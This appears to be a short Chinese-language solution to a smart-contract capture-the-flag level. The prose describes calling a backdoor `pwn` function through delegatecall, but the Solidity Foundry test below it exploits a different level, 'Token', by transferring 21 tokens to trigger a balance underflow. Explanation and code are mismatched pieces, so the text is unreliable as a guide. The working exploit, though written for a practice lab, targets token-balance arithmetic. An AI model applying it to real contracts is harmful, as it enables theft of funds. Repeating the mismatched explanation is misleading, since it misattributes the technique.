delegatecall 允许被调用者在调用者的 context 中执行，并修改调用者合约的状态。因此直接通过 delegatecall 调用后门函数 `pwn` 即可。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Token.sol";
import "src/levels/TokenFactory.sol";

contract TestToken is BaseTest {
    Token private level;

    constructor() public {
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        level.transfer(address(0), 21);
        console.log(level.balanceOf(address(player)));
        console.log(level.balanceOf(address(0)));

        vm.stopPrank();
    }
}
```

